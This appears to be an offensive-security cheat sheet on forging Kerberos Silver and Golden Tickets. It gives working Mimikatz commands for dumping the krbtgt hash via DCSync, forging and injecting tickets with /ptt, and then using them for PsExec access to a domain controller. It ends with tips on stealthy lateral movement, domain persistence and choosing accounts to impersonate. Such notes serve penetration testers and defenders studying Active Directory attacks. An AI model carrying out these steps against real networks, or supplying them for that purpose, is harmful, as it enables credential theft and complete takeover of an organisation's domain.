z# Silver & Golden Ticket Attacks (Kerberos Forgery)

## Overview

Kerberos relies heavily on trust in ticket-granting mechanisms. If an attacker obtains the right key material (NTLM hash of service accounts or `krbtgt`), they can forge Kerberos tickets to impersonate users or services.

---

## Key Differences

|Feature|**Silver Ticket**|**Golden Ticket**|
|---|---|---|
|Target|A specific service on a host (e.g., CIFS, HTTP)|Any service/domain-wide|
|Key Required|NTLM hash of a **service account**|NTLM hash of the **krbtgt** account|
|Ticket Forged|TGS (Service ticket)|TGT (Ticket Granting Ticket)|
|DC Interaction|No (offline, stealthier)|Yes (trusted by DC)|
|Scope of Access|One service/host|Full domain impersonation|
|Detectability|Lower (no DC comms)|Higher (used across DCs)|

---

# Silver Ticket Attack

## Description

A **Silver Ticket** is a forged **TGS ticket** that allows the attacker to authenticate to a specific service (e.g., CIFS, HTTP) on a specific machine without contacting the Domain Controller.

## Requirements

- NTLM hash of the target **service account**
    
- **SPN** and **hostname** of the target service
    
- Domain SID and name
    

## How to Forge a Silver Ticket with Mimikatz

### Step 1: Obtain the Service Account Hash

Can be retrieved via:

- Dumping LSASS with Mimikatz / Rubeus / lsassy
    
- Dumping from `ntds.dit`
    
- DCSync
    

Example:

```
RC4/NTLM: 4d28cf5252d39971419580a51484ca09
```

### Step 2: Forge Ticket with Mimikatz

```powershell
kerberos::golden /user:<username> /domain:<domain> /sid:<domain-sid> /target:<fqdn> /service:<service> /rc4:<hash> /ptt
```

**Example:**

```powershell
mimikatz # kerberos::golden /user:jeffadmin /domain:corp.local /sid:S-1-5-21-1234... /target:web.corp.local /service:http /rc4:4d28cf... /ptt
```

- `/ptt`: Pass-the-ticket (loads the ticket into memory)
    

### Step 3: Use the Ticket

Check ticket:

```bash
klist
```

Access the target service:

```powershell
Invoke-WebRequest -UseDefaultCredentials http://web.corp.local
```

You can also use `PsExec`, RDP, SMB access depending on the forged service.

---

# Golden Ticket Attack

## Description

A **Golden Ticket** is a forged **TGT** that allows an attacker to impersonate any user, including domain admins, and authenticate anywhere in the domain.

## Requirements

- NTLM hash of the **krbtgt** account
    
- Domain SID and domain name
    
- Username to impersonate (usually `Administrator`)
    

### Step 1: Dump `krbtgt` Hash

Via DCSync:

```powershell
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

Output:

```
NTLM: 1693c6cefafffc7af11ef34d1c788f47
```

### Step 2: Forge Ticket with Mimikatz

```powershell
kerberos::golden /user:administrator /domain:corp.local /sid:<domain-sid> /krbtgt:<hash> /ptt
```

**Example:**

```powershell
mimikatz # kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-1234... /krbtgt:1693c6ce... /ptt
```

### Step 3: Use the Ticket

Check:

```bash
klist
```

Access high-priv systems:

```bash
PsExec.exe \\dc01 cmd.exe
```

If the Golden Ticket is valid, this gives **full domain admin access**.

---

## Summary: Silver vs. Golden Tickets

|Feature|Silver Ticket|Golden Ticket|
|---|---|---|
|Forged Ticket|TGS|TGT|
|Scope|Single host/service|Entire domain|
|Key Needed|NTLM hash of service account|NTLM hash of krbtgt account|
|Tools|Mimikatz|Mimikatz|
|DC Interaction|None|Yes (DC accepts forged TGT)|
|Use Cases|Access file shares, RDP, HTTP services|Domain Admin, DCSync, unrestricted impersonation|

---

## Notes

- Forge Silver Tickets for **stealthy lateral movement**
    
- Forge Golden Tickets for **domain persistence or privilege escalation**
    
- Use BloodHound or `net group "Domain Admins"` to identify ideal users to impersonate
    
- `kerberos::ptt` can be used independently to inject any `.kirbi` ticket
    

---

## References

- [Mimikatz by Benjamin Delpy](https://github.com/gentilkiwi/mimikatz)
    
- [AD Security - Kerberos Attacks](https://adsecurity.org/?p=2011)
    
- [Harmj0y’s Kerberos Notes](https://posts.specterops.io/kerberos-delegation-spns-and-more-973e3d57cfc4)
    
- [BloodHound for Account Targeting](https://bloodhound.readthedocs.io/)
    